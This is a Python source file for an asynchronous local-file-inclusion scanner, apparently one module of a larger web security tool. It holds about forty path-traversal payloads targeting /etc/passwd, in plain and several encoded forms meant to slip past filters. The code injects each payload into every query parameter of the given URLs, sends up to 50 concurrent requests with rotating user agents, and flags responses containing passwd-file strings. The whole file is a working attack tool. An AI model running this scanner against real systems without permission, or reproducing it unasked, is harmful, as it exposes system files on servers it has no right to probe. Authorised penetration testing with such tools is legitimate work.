import asyncio
import aiohttp
from colorama import Fore, init
import urllib.parse
import random
from scripts.useragent.user_agent import _useragent_list

init(autoreset=True)

grey = Fore.LIGHTBLACK_EX
green = Fore.GREEN

lfi_payloads = [
    "etc/passwd",
    "/etc/passwd",
    "..;/etc/passwd",
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../../etc/passwd",
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../etc/passwd",
    "..%2fetc%2fpasswd",
    "..%2f..%2fetc%2fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%252e%252e/%252e%252e/%252e%252e/etc/passwd",
    "%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
    "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
    "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%2f%252e%252e%2f%252e%252e%2f%252e%252e%2fetc/passwd",
    "%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215etc%u2215passwd",
    "%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
    "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
    "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
    "%e0%40%ae%e0%40%ae%c0%afetc%c0%afpasswd",
    "%e0%40%ae%e0%40%ae%c0%af%e0%40%ae%e0%40%ae%c0%afetc%c0%afpasswd",
    "%c1%1c..%c1%1c..%c1%1cetc%c1%1cpasswd",
    "..%c0%ae/..%c0%ae/..%c0%ae/etc/passwd"
]

keywords = [
    "root:x:0:0",
    "/bin/bash",
    "/bin/sh",
    "/usr/sbin/nologin",
    "daemon:x:",
    "bin:x:",
    "sys:x:",
    "sync:x:",
    "games:x:",
    "nobody:x:",
    ":/home/",
    ":/root",
    ":/usr/sbin",
]

sem = asyncio.Semaphore(50)
async def scan_lfi(url,session):
    user_agent = random.choice(_useragent_list)
    header = {"User-Agent":user_agent}
    async with sem:
        try:
            async with session.get(url, headers=header, timeout=10) as response:
                response_text = await response.text()
                if any(keyword in response_text for keyword in keywords):
                    print(f"{grey}[{url}] {green}LFI FOUND")
        except Exception:
            pass
async def main(url: str = None, file: str = None):
    tasks = []
    async with aiohttp.ClientSession() as session:
        if not file and url:
            for payload in lfi_payloads:
                urlParse = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qsl(urlParse.query)
                new_qs = [(k, payload) for k,_ in qs]
                qs_encode = urllib.parse.urlencode(new_qs)
                new_url = urllib.parse.urlunparse(urlParse._replace(query=qs_encode))
                tasks.append(scan_lfi(new_url,session))
            await asyncio.gather(*tasks)
        elif file and not url:
            with open(file, 'r') as read_urls:
                urls = read_urls.readlines()
            for payload in lfi_payloads:
                for url in urls:
                    urlparsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qsl(urlparsed.query)
                    new_qs = [(k,payload) for k,_ in qs]
                    encode_qs = urllib.parse.urlencode(new_qs)
                    new_url = urllib.parse.urlunparse(urlparsed._replace(query=encode_qs))
                    tasks.append(scan_lfi(new_url, session))
                
            await asyncio.gather(*tasks)